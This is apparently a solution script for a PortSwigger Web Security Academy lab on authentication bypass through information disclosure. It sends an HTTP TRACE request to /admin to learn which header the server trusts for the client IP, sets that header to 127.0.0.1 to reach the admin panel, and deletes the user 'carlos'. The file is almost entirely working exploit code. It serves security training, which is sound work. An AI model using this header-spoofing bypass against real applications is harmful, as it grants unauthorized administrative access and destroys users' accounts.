# Authentication bypass via information disclosure

# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_trace_req(url):
	req = requests.Request('TRACE', url)
	r = req.prepare()
	s = requests.Session()
	resp = s.send(r)
	return resp

def get_header(url):
	print('\n[+] Trying to retrieve the header sending a TRACE request to the admin page...\n')
	admin_path = url + '/admin'
	r = send_trace_req(admin_path)
	time.sleep(1)
	print(r.text)
	header = r.text.encode().split(b'\r\n')[-3].split(b': ')[0].decode()
	print('[+] Found Header:\t%s' % header)
	time.sleep(1)
	return header

def delete_carlos(s, url, header):
	headers = {header: '127.0.0.1'}
	print('\n[+] Trying to access to the admin panel with header:\n%s' % headers)
	admin_path = url + '/admin'
	r = s.get(admin_path, headers=headers)
	time.sleep(1)
	print('\n[+] Trying to delete Carlos user...')
	delete_user_path = url + '/admin/delete?username=carlos'
	r = s.get(delete_user_path, headers=headers)
	time.sleep(1)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Authentication bypass via information disclosure')
	parser = argparse.ArgumentParser(description="[+] Lab: Authentication bypass via information disclosure")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to bypass authentication to delete carlos...\n')
			time.sleep(1)
			header = get_header(url)
			r = delete_carlos(s, url, header)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
